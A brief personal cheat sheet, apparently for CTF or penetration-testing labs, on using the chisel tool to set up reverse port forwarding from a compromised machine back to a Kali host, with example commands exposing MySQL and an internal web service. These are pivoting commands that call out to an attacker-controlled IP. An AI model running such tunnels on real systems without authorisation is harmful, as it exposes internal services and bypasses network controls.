# chisel

get the binary from https://github.com/jpillora/chisel


**on my pc** : 

```bash
chisel server -p 80 --reverse
```
```bash
netstat -nltup
```

**on the box fomat** :

```sh
./chisel client {you kali ip}:{port on which you start chisel} R:{port of kali you want to access the service of box }:127.0.0.1:{box port you want to bring out}
```
**eg**
```
./chisel client 192.168.1.7:80 R:5000:127.0.0.1:5000 
```
> mysql
```sh
client 192.168.56.1:80 R:3306:127.0.0.1:3306               
```
> http
```sh
./chisel-amd64 client 10.10.14.5:80 R:8085:192.168.122.4:80 			
```
